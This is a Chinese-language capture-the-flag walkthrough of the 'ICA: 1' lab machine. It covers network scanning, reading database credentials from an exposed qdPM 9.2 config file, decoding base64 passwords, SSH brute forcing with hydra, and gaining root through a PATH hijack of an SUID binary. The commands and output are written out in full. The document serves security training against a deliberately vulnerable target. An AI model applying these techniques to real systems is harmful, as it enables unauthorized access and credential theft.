+++
title = "ICA: 1"
date = 2026-03-11
draft = false
weight = 1
+++


## 一、信息收集
### 1.1 ip地址修复
GRUB引导菜单，按`e`进入编辑模式，将`ro quiet`替换为`rw signle init=/bin/bash`，按`ctrl + x`启动，`ip link show`确认网卡真实姓名(ens33)，接着`sudo nano /etc/network/interfaces`，将`auto enp0s3`修改为`auto ens33`，第二行的`enp0s3`修改为`ens33`
接着外部侦测，使用arp0scan
```zsh
sudo arp-scan -l
```
其中129是kali，1是宿主机，2是虚拟网关，131是目标靶机，254是DHCP服务器
### 1.1 nmap扫描
```ZSH
sudo nmap -sS -sV -sC -T4 192.168.203.131
```
开放了22、80、3306端口，ssh、apache、mysql服务
### 1.2 gobuster目录扫描
```ZSH
gobuster dir -u http://192.168.203.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/images               (Status: 301) [Size: 319] [--> http://192.168.203.131/images/]
/uploads              (Status: 301) [Size: 320] [--> http://192.168.203.131/uploads/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.203.131/css/]
/template             (Status: 301) [Size: 321] [--> http://192.168.203.131/template/]
/core                 (Status: 301) [Size: 317] [--> http://192.168.203.131/core/]
/install              (Status: 301) [Size: 320] [--> http://192.168.203.131/install/]
/manual               (Status: 301) [Size: 319] [--> http://192.168.203.131/manual/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.203.131/js/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.203.131/javascript/]
/sf                   (Status: 301) [Size: 315] [--> http://192.168.203.131/sf/]
/backups              (Status: 301) [Size: 320] [--> http://192.168.203.131/backups/]
/batch                (Status: 301) [Size: 318] [--> http://192.168.203.131/batch/]
/server-status        (Status: 403) [Size: 280]
```
但网页内也没有信息
## 二、漏洞利用（qdpm 9.2）
登录界面框架是qdpm9.2
网站`https://www.exploit-db.com/`中搜索qdpm9.2，找到两个EXP(Exploit,针对漏洞编写的具体代码or攻击方法)，**未验证的密码暴漏**中写出：
```
The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.
```

## 三、数据库信息收集和利用
将文件下载到本地，获得数据库账户：qdpmadmin，密码：UcVQCMQk2STVeS6J，再进行登录
```ZSH
┌──(kali㉿kali)-[~]
└─$ mysql -h192.168.203.131 -uqdpmadmin -pUcVQCMQk2STVeS6J
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain

┌──(kali㉿kali)-[~]
└─$ mysql -h 192.168.203.131 -u qdpmadmin -pUcVQCMQk2STVeS6J --skip-ssl
```
mysql客户端中，`-u(可以有空格)[用户名]`、`-p(不能有空格)[密码]`，(但建议只输入`-p`回车后，再输入密码，否则密码会以明文形式保存在`~/.bash_history`)报错是由于SSL握手失败。
接着进行数据库操作：
```ZSH
show databases;
use qdpm;
show tables;
select * from users;

use staff;
select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+

select * from login;
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
```
获得的密码是base64加密，经过解密
suRJAdGwLp8dy3rF 
7ZwV4qtg42cmUXGX 
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy
（这里username开头**小写**，不然没结果）
接着创建`username.txt`、`passwd.txt`两个文件，分别将信息输入（一行一个），用hydra爆破`hydra -L username.txt -P passwd.txt ssh://192.168.203.131`，获得两个有用的账户和密码，travis；DJceVy98W28Y7wLg，dexter；7ZwV4qtg42cmUXGX

利用账户密码，用ssh尝试登录，`ssh travis@192.168.203.131`，进入后获得如下信息：
```ZSH
travis@debian:~$ ls
user.txt
travis@debian:~$ cat user.txt
ICA{Secret_Project}
```

`ssh dexter@192.168.203.131`，进入后获得如下信息：
```ZSH
dexter@debian:~$ ls
note.txt
dexter@debian:~$ cat note.txt
It seems to me that there is a weakness while accessing the system.
As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not.
```

## 四、提权
根据提示，和可执行文件有关，查看具有root权限的可执行文件有哪些
```ZSH
dexter@debian:~$ cd ./
dexter@debian:/home/dexter$ find / -perm -4000 -type f 2>/dev/null
/opt/get_access
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

而第一个/opt/get_access文件很可疑，`strings`出来一个cat命令
```ZSH
dexter@debian:/home/dexter$ cd /opt
dexter@debian:/opt$ ls
get_access
dexter@debian:/opt$ strings get_access
/lib64/ld-linux-x86-64.so.2
setuid
......（省略）
cat /root/system.info
......（省略） 
```

而直接运行`cat`失效，由于`/root/system.info`存放在root的家目录下。在Linux中，普通用户（如`dexter`）没有读取root文件的权限。
而从输出中看到两个信息：
  1. `setuid`说明程序有**SUID权限**，当运行时，会临时获得root身份
  2. `cat /root/system.info`，调用了`cat`，且没有写绝对路径（写的是`cat`，而不是`/bin/cat`）
  3. 漏洞在于：当程序只写`cat`时，会根据系统`PATH`环境变量挨个文件夹找哪里有叫`cat`的程序

接着自己编写一个cat命令写入环境，让其引用我们的cat命令。
先在`/tmp`目录下创建一个名为`cat`的文件，但它的内容是启动Bash Shell的指令，再给假的cat权限，修改PATH，先让系统找假cat，最后运行`/opt`下的`get_access`文件
```
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
/opt/get_access
```

成功获得root权限！

由于改变了cat命令，这个时候使用`vim root.txt`查看文件内容或者删除`/tmp/cat`文件，然后`cat root.txt`查看文件内容，成功获得flag
```
root@debian:/root# cd /tmp
root@debian:/tmp# rm cat
root@debian:/tmp# ls
systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-apache2.service-UBSkmg
systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-systemd-logind.service-MKPw9i
systemd-private-0fa7ab6b0e2b4030b0b2e8cb9a2bece0-systemd-timesyncd.service-WEHXpj
root@debian:/tmp# cat /root/root.txt
ICA{Next_Generation_Self_Renewable_Genetics}
```

